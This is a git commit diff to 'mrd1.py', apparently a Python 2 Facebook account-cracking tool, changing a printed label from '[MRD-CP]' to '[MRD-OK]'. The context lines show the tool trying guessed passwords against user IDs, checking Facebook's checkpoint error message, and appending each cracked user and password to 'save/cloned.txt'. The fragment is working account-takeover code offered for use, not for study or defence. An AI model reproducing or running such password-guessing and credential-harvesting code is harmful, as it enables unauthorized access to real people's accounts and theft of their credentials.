ce5ffd8ba71c5754e3265da5b15e10a0af0575d8
Mr.devil <103495827+Mrdevilbrand@users.noreply.github.com>
2022-04-30 19:04:48 +0500

    Update mrd1.py

--- mrd1.py
+++ mrd1.py
@@ -190,7 +190,7 @@ def action():
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m[MRD-CP] ' + k + c + user + '  |  ' + pass1
+                    print '\033[1;97m[MRD-OK] ' + k + c + user + '  |  ' + pass1
                     cps = open('save/cloned.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -207,7 +207,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m[MRD-CP] ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m[MRD-OK] ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
